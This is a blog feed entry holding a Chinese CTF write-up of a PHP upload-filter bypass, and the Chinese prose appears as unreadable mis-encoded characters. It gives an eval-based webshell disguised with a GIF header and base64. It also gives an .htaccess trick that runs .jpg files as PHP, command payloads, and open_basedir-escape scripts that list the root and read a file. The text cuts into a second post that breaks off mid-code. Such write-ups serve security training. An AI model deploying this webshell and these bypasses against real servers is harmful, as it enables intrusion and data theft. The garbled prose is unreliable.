å®¡è®¡æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦ä¸Šä¼ æ–‡ä»¶åˆ°è¯¥ç½‘ç«™ä¸­ï¼Œæ‰èƒ½æˆåŠŸè¿è¡Œï¼Œä½†æ˜¯è¯¥ç½‘ç«™æ²¡æœ‰æä¾›ç»™æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±åˆ›é€ ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ¥å£ï¼Œå°†æˆ‘ä»¬æœ¬åœ°æ–‡ä»¶çš„å†…å®¹ä¸Šä¼ åˆ°è¯¥ç½‘ç«™ä¸Š<br>2.æ ¹æ®ä»£ç å®¡è®¡æˆ‘ä»¬å‘ç°åç¼€è¿‡æ»¤ï¼Œä½†æ˜¯è¿™ç§è¿‡æ»¤æ–¹å¼å¯ä»¥ç”¨.php.è¿›è¡Œç»•è¿‡ï¼Œæˆ–è€…ä½¿ç”¨å›¾ç‰‡åç¼€åé…åˆ.htaccessæ–‡ä»¶è¿›è¡Œç»•è¿‡<br>3.exif_imagetype($tmp_name)æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºå›¾ç‰‡ç±»å‹ï¼Œä½¿ç”¨æ·»åŠ æ–‡ä»¶å¹»æœ¯å¤´è¿›è¡Œç»•è¿‡ï¼Œ.htaccessä¸­#ä½œä¸ºæ³¨é‡Šï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨XBMæ–‡ä»¶çš„ï¼Œè€Œä¸Šä¼ çš„PHPä»£ç æ–‡ä»¶å¯ä»¥æ·»åŠ æ›´ä¸ºæ–¹ä¾¿çš„GIFæ–‡ä»¶çš„GIF89a66<br>4.mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)å¯¹æ–‡ä»¶phpå†…å®¹çš„å¼€å¤´è¿›è¡Œåˆ¤æ–­ï¼Œå¯ä»¥ä½¿ç”¨&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt;è¿›è¡Œç»•è¿‡ï¼Œä¸è¿‡å‰ææ˜¯phpè¿è¡Œå†…æ ¸ç‰ˆæœ¬&lt;7.0,æˆ–è€…ä½¿ç”¨åŠ å¯†å†…å®¹ä¼ è¾“ï¼Œé…åˆ.htaccessæ–‡ä»¶è§£å¯†åŠ å¯†çš„æ–‡ä»¶å†…å®¹<br></code></pre></td></tr></table></figure><h2 id="åˆ›é€ ä¸Šä¼ æ–‡ä»¶çš„html"><a href="#åˆ›é€ ä¸Šä¼ æ–‡ä»¶çš„html" class="headerlink" title="åˆ›é€ ä¸Šä¼ æ–‡ä»¶çš„html:"></a>åˆ›é€ ä¸Šä¼ æ–‡ä»¶çš„html:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ä¸Šä¼ &quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡ŒæŒ‡å®šçš„urlæ˜¯æŒ‡ç›®æ ‡ç½‘ç«™åœ°å€ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å¯„å­˜åœ¨ç›®æ ‡ç½‘ç«™çš„tmpç›®å½•ä¸Šç­‰å¾…è¢«å¤„ç†ï¼Œè¿™é‡ŒåŒæ—¶åœ¨è®¿é—®ç›®æ ‡ç½‘å€æ—¶å¯åŠ¨get_the_flag()å‡½æ•°ï¼Œç”¨äºä¸Šä¼ æ–‡ä»¶åèƒ½ç›´æ¥å¤„ç†tmpç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p><h2 id="æŸ¥çœ‹ç½‘é¡µè¿è¡Œçš„phpç‰ˆæœ¬"><a href="#æŸ¥çœ‹ç½‘é¡µè¿è¡Œçš„phpç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹ç½‘é¡µè¿è¡Œçš„phpç‰ˆæœ¬:"></a>æŸ¥çœ‹ç½‘é¡µè¿è¡Œçš„phpç‰ˆæœ¬:</h2><p><img src="/images/2024-2-18/image-20240213220802182.png" alt="image-20240213220802182"></p><p>phpç‰ˆæœ¬ä¸º7.2.19æ‰€ä»¥ä¸èƒ½ä½¿ç”¨&lt;script language&#x3D;â€phpâ€&gt;@eval($_POST[â€˜passâ€™]);&lt;&#x2F;script&gt;è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥è¦é€ƒè¿‡å¯¹&lt;?çš„æ£€æµ‹åªèƒ½ä½¿ç”¨æ–‡ä»¶å†…å®¹åŠ å¯†é…åˆ.htaccessæ–‡ä»¶åŠ å¯†æ–‡ä»¶å†…å®¹ï¼Œä½¿ç”¨äº†.htaccessæ–‡ä»¶ï¼Œå°±ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶å§ã€‚</p><h2 id="å‡†å¤‡ä¸Šä¼ æ–‡ä»¶"><a href="#å‡†å¤‡ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="å‡†å¤‡ä¸Šä¼ æ–‡ä»¶:"></a>å‡†å¤‡ä¸Šä¼ æ–‡ä»¶:</h2><h3 id="pass-php"><a href="#pass-php" class="headerlink" title="pass.php:"></a>pass.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a66<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win!!!&quot;</span>;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>&#x3D;&gt;è½¬åŒ–ä¸ºç»•è¿‡æ–‡ä»¶:</p><h3 id="pass-jpg"><a href="#pass-jpg" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">GIF89a66<br><br>PD9waHAgZWNobyAid2luISEhIjtAZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4g<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213222006414.png" alt="image-20240213222006414"></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h4><h4 id="æ·»åŠ XBMæ–‡ä»¶å¹»æœ¯å¤´"><a href="#æ·»åŠ XBMæ–‡ä»¶å¹»æœ¯å¤´" class="headerlink" title="æ·»åŠ XBMæ–‡ä»¶å¹»æœ¯å¤´:"></a>æ·»åŠ XBMæ–‡ä»¶å¹»æœ¯å¤´:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">#define width 1337<br><br>#define height 1337<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br><br>#define height 1337<br><br>php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./pass.jpg&quot;<br><br>AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213222127585.png" alt="image-20240213222127585"></p><h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)<br>x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´<br>.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé‡‡ç”¨æ–¹æ³•ä¸€çš„.htaccessæ–‡ä»¶ã€‚</p><h2 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶:"></a>ä¸Šä¼ æ–‡ä»¶:</h2><h3 id="pass-jpg-1"><a href="#pass-jpg-1" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><h4 id="ä¸Šä¼ "><a href="#ä¸Šä¼ " class="headerlink" title="ä¸Šä¼ :"></a>ä¸Šä¼ :</h4><p><img src="/images/2024-2-18/image-20240213225818685.png" alt="image-20240213225818685"></p><h4 id="å“åº”ç»“æœ"><a href="#å“åº”ç»“æœ" class="headerlink" title="å“åº”ç»“æœ:"></a>å“åº”ç»“æœ:</h4><p><img src="/images/2024-2-18/image-20240213225759507.png" alt="image-20240213225759507"></p><h3 id="htaccess-1"><a href="#htaccess-1" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="ä¸Šä¼ -1"><a href="#ä¸Šä¼ -1" class="headerlink" title="ä¸Šä¼ :"></a>ä¸Šä¼ :</h4><p><img src="/images/2024-2-18/image-20240213225924525.png" alt="image-20240213225924525"></p><h4 id="å“åº”ç»“æœ-1"><a href="#å“åº”ç»“æœ-1" class="headerlink" title="å“åº”ç»“æœ:"></a>å“åº”ç»“æœ:</h4><p><img src="/images/2024-2-18/image-20240213230120518.png" alt="image-20240213230120518"></p><h2 id="è®¿é—®æˆ‘ä»¬çš„pass-jpg"><a href="#è®¿é—®æˆ‘ä»¬çš„pass-jpg" class="headerlink" title="è®¿é—®æˆ‘ä»¬çš„pass.jpg:"></a>è®¿é—®æˆ‘ä»¬çš„pass.jpg:</h2><p><img src="/images/2024-2-18/image-20240213230241660.png" alt="image-20240213230241660"></p><h3 id="æµ‹è¯•æœ¨é©¬æ–‡ä»¶æ˜¯å¦å¯ç”¨"><a href="#æµ‹è¯•æœ¨é©¬æ–‡ä»¶æ˜¯å¦å¯ç”¨" class="headerlink" title="æµ‹è¯•æœ¨é©¬æ–‡ä»¶æ˜¯å¦å¯ç”¨:"></a>æµ‹è¯•æœ¨é©¬æ–‡ä»¶æ˜¯å¦å¯ç”¨:</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=phpinfo();<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213230347611.png" alt="image-20240213230347611"></p><p>æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶å¯ä»¥è¢«ä½¿ç”¨ï¼ï¼ï¼</p><h2 id="æŸ¥çœ‹æ–‡ä»¶æ ¹ç›®å½•"><a href="#æŸ¥çœ‹æ–‡ä»¶æ ¹ç›®å½•" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶æ ¹ç›®å½•:"></a>æŸ¥çœ‹æ–‡ä»¶æ ¹ç›®å½•:</h2><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213230511448.png" alt="image-20240213230511448"></p><p>æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œå¯èƒ½æ˜¯å¯¹å‡½æ•°è¿›è¡Œç¦ç”¨äº†ã€‚</p><h2 id="æŸ¥çœ‹phpinfo-äº†è§£ç¦ç”¨å†…å®¹"><a href="#æŸ¥çœ‹phpinfo-äº†è§£ç¦ç”¨å†…å®¹" class="headerlink" title="æŸ¥çœ‹phpinfo()äº†è§£ç¦ç”¨å†…å®¹:"></a>æŸ¥çœ‹phpinfo()äº†è§£ç¦ç”¨å†…å®¹:</h2><p><img src="/images/2024-2-18/image-20240213230650369.png" alt="image-20240213230650369"></p><p>ç¦ç”¨äº†å¯¹ç³»ç»Ÿå‘½ä»¤çš„ä½¿ç”¨ï¼Œæ‰€ä»¥åªèƒ½é‡‡å–èšå‰‘è¿æ¥äº†ã€‚</p><h2 id="èšå‰‘è¿æ¥æœ¨é©¬æ–‡ä»¶"><a href="#èšå‰‘è¿æ¥æœ¨é©¬æ–‡ä»¶" class="headerlink" title="èšå‰‘è¿æ¥æœ¨é©¬æ–‡ä»¶:"></a>èšå‰‘è¿æ¥æœ¨é©¬æ–‡ä»¶:</h2><p><img src="/images/2024-2-18/image-20240213231219940.png" alt="image-20240213231219940"></p><h3 id="ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥æŸ¥çœ‹"><a href="#ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥æŸ¥çœ‹" class="headerlink" title="ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥æŸ¥çœ‹:"></a>ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥æŸ¥çœ‹:</h3><p>ï¼ˆå‰ææ˜¯èšå‰‘æ‹¥æœ‰å¯ä»¥è®¿é—®æ ¹ç›®å½•ä¸­æ–‡ä»¶ä¿¡æ¯çš„æƒé™ï¼‰</p><h4 id="æŸ¥çœ‹æ–‡ä»¶çš„æ ¹ç›®å½•ä¿¡æ¯"><a href="#æŸ¥çœ‹æ–‡ä»¶çš„æ ¹ç›®å½•ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶çš„æ ¹ç›®å½•ä¿¡æ¯:"></a>æŸ¥çœ‹æ–‡ä»¶çš„æ ¹ç›®å½•ä¿¡æ¯:</h4><p><img src="/images/2024-2-18/image-20240213231338423.png" alt="image-20240213231338423"></p><p>å‘ç°ä¸€ä¸ªflagç›¸å…³æ–‡ä»¶</p><h4 id="æ‰“å¼€THis-Is-tHe-F14gæ–‡ä»¶"><a href="#æ‰“å¼€THis-Is-tHe-F14gæ–‡ä»¶" class="headerlink" title="æ‰“å¼€THis_Is_tHe_F14gæ–‡ä»¶:"></a>æ‰“å¼€THis_Is_tHe_F14gæ–‡ä»¶:</h4><p><img src="/images/2024-2-18/image-20240213231455476.png" alt="image-20240213231455476"></p><p>è·å¾—flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p><h3 id="ç¬¬äºŒç§æ–¹å¼ï¼šåœ¨ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ä¸­å†åˆ›å»ºä¸€ä¸ªshell-phpç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯ï¼š"><a href="#ç¬¬äºŒç§æ–¹å¼ï¼šåœ¨ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ä¸­å†åˆ›å»ºä¸€ä¸ªshell-phpç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯ï¼š" class="headerlink" title="ç¬¬äºŒç§æ–¹å¼ï¼šåœ¨ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ä¸­å†åˆ›å»ºä¸€ä¸ªshell.phpç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯ï¼š"></a>ç¬¬äºŒç§æ–¹å¼ï¼šåœ¨ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ä¸­å†åˆ›å»ºä¸€ä¸ªshell.phpç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯ï¼š</h3><p>ï¼ˆèšå‰‘æ— æ³•ç›´æ¥è·å–æ ¹ç›®å½•æ–‡ä»¶å†…å®¹æ—¶ä»¥åŠï¼‰</p><h4 id="è·å–æŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–æŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–æŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯:"></a>è·å–æŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯:</h4><h5 id="æ–°å»ºæ–‡ä»¶shell1-php"><a href="#æ–°å»ºæ–‡ä»¶shell1-php" class="headerlink" title="æ–°å»ºæ–‡ä»¶shell1.php:"></a>æ–°å»ºæ–‡ä»¶shell1.php:</h5><h6 id="shell1-php"><a href="#shell1-php" class="headerlink" title="shell1.php:"></a>shell1.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213232539210.png" alt="image-20240213232539210"></p><p><img src="/images/2024-2-18/image-20240213232556360.png" alt="image-20240213232556360"></p><p><img src="/images/2024-2-18/image-20240213233043246.png" alt="image-20240213233043246"></p><p><img src="/images/2024-2-18/image-20240213233319227.png" alt="image-20240213233319227"></p><h5 id="ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell1-php"><a href="#ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell1-php" class="headerlink" title="ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell1.php:"></a>ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell1.php:</h5><p>(ç”±äºæ˜¯åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºçš„shell1.phpï¼Œæ‰€ä»¥è®¿é—®æ—¶è¿˜æ˜¯ä»¥å½“å‰ç›®å½•ä¸‹çš„shell1.phpå»å¯åŠ¨è¿è¡Œè¯¥æ–‡ä»¶)</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell1.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213233439097.png" alt="image-20240213233439097"></p><p>è·å¾—ä¸€ä¸ªæ–‡ä»¶ï¼šTHis_Is_tHe_F14g</p><h4 id="è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶çš„å†…å®¹"><a href="#è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶çš„å†…å®¹" class="headerlink" title="è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶çš„å†…å®¹:"></a>è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶çš„å†…å®¹:</h4><h5 id="æ–°å»ºä¸€ä¸ªshell2-php"><a href="#æ–°å»ºä¸€ä¸ªshell2-php" class="headerlink" title="æ–°å»ºä¸€ä¸ªshell2.php:"></a>æ–°å»ºä¸€ä¸ªshell2.php:</h5><h6 id="shell2-php"><a href="#shell2-php" class="headerlink" title="shell2.php:"></a>shell2.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/THis_Is_tHe_F14g&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213234142911.png" alt="image-20240213234142911"></p><p><img src="/images/2024-2-18/image-20240213234201910.png" alt="image-20240213234201910"></p><h5 id="ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell2-php"><a href="#ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell2-php" class="headerlink" title="ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell2.php:"></a>ç½‘é¡µè®¿é—®æˆ‘ä»¬æ–°å»ºçš„shell2.php:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell2.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213234252121.png" alt="image-20240213234252121"></p><p>flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[HarekazeCTF2019]encode_and_encode</title>
    <link href="/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/"/>
    <url>/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/</url>
    
    <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/122724832">HarekazeCTF2019]encode_and_encode-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121439731">æ–‡ä»¶åŒ…å«&amp;PHPä¼ªåè®®åˆ©ç”¨_-CSDNåšå®¢</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240212204331473.png" alt="image-20240212204331473"></p><h2 id="ç‚¹å‡»source-codeæŸ¥çœ‹æºç "><a href="#ç‚¹å‡»source-codeæŸ¥çœ‹æºç " class="headerlink" title="ç‚¹å‡»source codeæŸ¥çœ‹æºç :"></a>ç‚¹å‡»source codeæŸ¥çœ‹æºç :</h2><p><img src="/images/2024-2-18/image-20240212204440471.png" alt="image-20240212204440471"></p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡:"></a>ä»£ç å®¡è®¡:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 